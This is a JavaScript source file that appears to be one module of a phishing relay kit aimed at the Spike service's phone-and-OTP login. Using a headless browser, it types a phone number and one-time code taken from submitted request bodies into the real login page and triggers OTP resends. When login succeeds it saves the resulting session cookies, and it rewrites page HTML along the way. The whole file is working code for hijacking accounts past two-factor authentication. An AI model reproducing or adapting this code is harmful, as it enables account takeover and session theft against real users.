const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let phoneInp = `[data-testid="enterMobileInput"]`
                await page.waitForSelector(phoneInp)
                await page.type(phoneInp, this.email)
                await page.click(`[data-testid="sendOtpBtn"]`)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["SERVICE OVERVIEW", "Profile", "Log Out"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-phone") {
                let phoneInp = `[data-testid="enterMobileInput"]`
                await page.waitForSelector(phoneInp)
                await page.type(phoneInp, body.phone)
                await page.click(`[data-testid="sendOtpBtn"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            } else if (spikeType == "otp-code") {
                await page.evaluate(() => {
                    document.querySelectorAll(`[type="tel"]`).forEach((inp, index) => {
                        inp.setAttribute("spike-otp-inp", index)
                    })
                })

                for (let index = 0; index < 4; index++) {
                    await page.waitForSelector(`[spike-otp-inp="${index}"]`)
                    await page.type(`[spike-otp-inp="${index}"]`, body.otp_code[index])
                }

                await page.click(`[data-testid="loginBtn"]`)
                let result = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch" || response.request().resourceType() == "xhr") {
                        if (response.url().includes("verifyOtp")) {
                            const data = await response.json()
                            if (!data.hasOwnProperty("errorCode")) {
                                result = true
                            }
                            return true
                        }
                    }
                })

                if (result) return await this.saveCookies()
            } else if (spikeType == "resend-code") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText.includes("RESEND OTP")) {
                            btn.setAttribute("spike-resend-btn", true)
                        }
                    })
                })

                await page.waitForSelector(`[spike-resend-btn="true"]`)
                await page.click(`[spike-resend-btn="true"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }